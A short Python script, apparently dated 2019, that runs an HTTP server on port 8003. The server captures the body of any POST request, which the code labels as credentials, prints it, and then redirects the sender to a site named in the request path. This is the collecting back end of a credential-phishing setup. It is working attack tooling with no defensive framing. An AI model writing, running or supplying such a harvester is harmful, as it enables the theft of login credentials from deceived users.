# -*- coding: utf-8 -*-
"""
Created on Fri Apr 12 10:00:45 2019

@author: QIAN
"""

import http.server as SimpleHTTPServer
import socketserver
import urllib

class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        creds = self.rfile.read(content_length).decode('utf-8')
        print (creds)
        site = self.path[1:]
        self.send_response(301)
        self.send_header('Location', urllib.parse.unquote(site))
        self.end_headers()

server = socketserver.TCPServer(('0.0.0.0', 8003), CredRequestHandler)
server.serve_forever()